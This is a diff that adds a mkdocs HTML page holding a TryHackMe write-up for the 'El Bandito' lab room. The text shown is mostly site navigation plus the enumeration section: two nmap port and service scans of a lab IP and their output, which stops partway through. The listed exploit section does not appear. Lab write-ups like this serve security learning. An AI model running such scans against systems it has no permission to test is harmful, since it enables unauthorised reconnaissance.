@@ -1,0 +1,1562 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../dombasedattacks/">
+      
+      
+        <link rel="next" href="../../tags/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>El Bandito - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#el-bandito" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              El Bandito
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attacktivedirectory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacktive Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blaster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blaster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blueprint
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bolt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brainpan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainpan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brainstorm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainstorm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chillhack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chill Hack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../colddboxeasy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ColddBox Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cyberheroes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CyberHeroes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dailybugle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Daily Bugle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dombasedattacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-Based Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    El Bandito
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    El Bandito
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../HackTheBox/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../alfred/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    TryHackme
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="el-bandito">El Bandito<a class="headerlink" href="#el-bandito" title="Permanent link">&para;</a></h1>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<p>Scan de puertos vulnerables
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.183.199<span class="w"> </span>-oG<span class="w"> </span>allPorts
+
+Host<span class="w"> </span>discovery<span class="w"> </span>disabled<span class="w"> </span><span class="o">(</span>-Pn<span class="o">)</span>.<span class="w"> </span>All<span class="w"> </span>addresses<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>marked<span class="w"> </span><span class="s1">&#39;up&#39;</span><span class="w"> </span>and<span class="w"> </span>scan<span class="w"> </span><span class="nb">times</span><span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>slower.
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-06-29<span class="w"> </span><span class="m">01</span>:21<span class="w"> </span>-04
+Initiating<span class="w"> </span>SYN<span class="w"> </span>Stealth<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">01</span>:21
+Scanning<span class="w"> </span><span class="m">10</span>.10.183.199<span class="w"> </span><span class="o">[</span><span class="m">65535</span><span class="w"> </span>ports<span class="o">]</span>
+Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">22</span>/tcp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.183.199
+Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">80</span>/tcp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.183.199
+Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span>/tcp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.183.199
+Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">631</span>/tcp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.183.199
+Completed<span class="w"> </span>SYN<span class="w"> </span>Stealth<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">01</span>:21,<span class="w"> </span><span class="m">15</span>.78s<span class="w"> </span>elapsed<span class="w"> </span><span class="o">(</span><span class="m">65535</span><span class="w"> </span>total<span class="w"> </span>ports<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.183.199
+Host<span class="w"> </span>is<span class="w"> </span>up,<span class="w"> </span>received<span class="w"> </span>user-set<span class="w"> </span><span class="o">(</span><span class="m">0</span>.23s<span class="w"> </span>latency<span class="o">)</span>.
+Scanned<span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-06-29<span class="w"> </span><span class="m">01</span>:21:39<span class="w"> </span>-04<span class="w"> </span><span class="k">for</span><span class="w"> </span>16s
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65531</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>REASON
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">        </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">       </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">62</span>
+<span class="m">631</span>/tcp<span class="w">  </span>open<span class="w">  </span>ipp<span class="w">        </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy<span class="w"> </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">62</span>
+</code></pre></div></p>
+<p>Buscamos servicios
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,80,631,8080<span class="w"> </span><span class="m">10</span>.10.183.199<span class="w">  </span>-oN<span class="w"> </span>targeted<span class="w"> </span>
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">  </span>VERSION
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">      </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.11<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>e2:43:a2:44:81:17:b0:bd:4c:c4:4e:09:a5:2b:33:60<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>da:7c:d9:56:da:36:f5:ad:3a:eb:95:ae:aa:14:87:b1<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">52</span>:fb:bf:03:d7:ce:dd:11:86:65:1b:f6:7b:77:fa:e3<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssl/http<span class="w"> </span>El<span class="w"> </span>Bandito<span class="w"> </span>Server
+<span class="p">|</span>_http-server-header:<span class="w"> </span>El<span class="w"> </span>Bandito<span class="w"> </span>Server
+<span class="p">|</span>_http-title:<span class="w"> </span>Site<span class="w"> </span>doesn<span class="s1">&#39;t have a title (text/html; charset=utf-8).</span>
+<span class="s1">| ssl-cert: Subject: commonName=localhost</span>
+<span class="s1">| Subject Alternative Name: DNS:localhost</span>
+<span class="s1">| Not valid before: 2021-04-10T06:51:56</span>
+<span class="s1">|_Not valid after:  2031-04-08T06:51:56</span>
+<span class="s1">| fingerprint-strings: </span>
+<span class="s1">|   FourOhFourRequest: </span>
+<span class="s1">|     HTTP/1.1 404 NOT FOUND</span>
+<span class="s1">|     Date: Sun, 29 Jun 2025 05:23:50 GMT</span>
+<span class="s1">|     Content-Type: text/html; charset=utf-8</span>
+<span class="s1">|     Content-Length: 207</span>
+<span class="s1">|     Content-Security-Policy: default-src &#39;</span>self<span class="s1">&#39;; script-src &#39;</span>self<span class="s1">&#39;; object-src &#39;</span>none<span class="s1">&#39;;</span>
+<span class="s1">|     X-Content-Type-Options: nosniff</span>
+<span class="s1">|     X-Frame-Options: SAMEORIGIN</span>
+<span class="s1">|     X-XSS-Protection: 1; mode=block</span>
+<span class="s1">|     Feature-Policy: microphone &#39;</span>none<span class="s1">&#39;; geolocation &#39;</span>none<span class="s1">&#39;;</span>
+<span class="s1">|     Age: 0</span>
+<span class="s1">|     Server: El Bandito Server</span>
+<span class="s1">|     Connection: close</span>
+<span class="s1">|     &lt;!doctype html&gt;</span>
+<span class="s1">|     &lt;html lang=en&gt;</span>
+<span class="s1">|     &lt;title&gt;404 Not Found&lt;/title&gt;</span>
+<span class="s1">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span>
+<span class="s1">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span>
+<span class="s1">|   GetRequest: </span>
+<span class="s1">|     HTTP/1.1 200 OK</span>
+<span class="s1">|     Date: Sun, 29 Jun 2025 05:22:51 GMT</span>
+<span class="s1">|     Content-Type: text/html; charset=utf-8</span>
+<span class="s1">|     Content-Length: 58</span>
+<span class="s1">|     Content-Security-Policy: default-src &#39;</span>self<span class="s1">&#39;; script-src &#39;</span>self<span class="s1">&#39;; object-src &#39;</span>none<span class="s1">&#39;;</span>
+<span class="s1">|     X-Content-Type-Options: nosniff</span>
+<span class="s1">|     X-Frame-Options: SAMEORIGIN</span>
+<span class="s1">|     X-XSS-Protection: 1; mode=block</span>
+<span class="s1">|     Feature-Policy: microphone &#39;</span>none<span class="s1">&#39;; geolocation &#39;</span>none<span class="s1">&#39;;</span>
+<span class="s1">|     Age: 0</span>
+<span class="s1">|     Server: El Bandito Server</span>
+<span class="s1">|     Accept-Ranges: bytes</span>
+<span class="s1">|     Connection: close</span>
+<span class="s1">|     nothing to see &lt;script src=&#39;</span>/static/messages.js<span class="s1">&#39;&gt;&lt;/script&gt;</span>
+<span class="s1">|   HTTPOptions: </span>
+<span class="s1">|     HTTP/1.1 200 OK</span>
+<span class="s1">|     Date: Sun, 29 Jun 2025 05:22:52 GMT</span>
+<span class="s1">|     Content-Type: text/html; charset=utf-8</span>
+<span class="s1">|     Content-Length: 0</span>
+<span class="s1">|     Allow: GET, OPTIONS, HEAD, POST</span>
+<span class="s1">|     Content-Security-Policy: default-src &#39;</span>self<span class="s1">&#39;; script-src &#39;</span>self<span class="s1">&#39;; object-src &#39;</span>none<span class="s1">&#39;;</span>
+<span class="s1">|     X-Content-Type-Options: nosniff</span>
+<span class="s1">|     X-Frame-Options: SAMEORIGIN</span>
+<span class="s1">|     X-XSS-Protection: 1; mode=block</span>
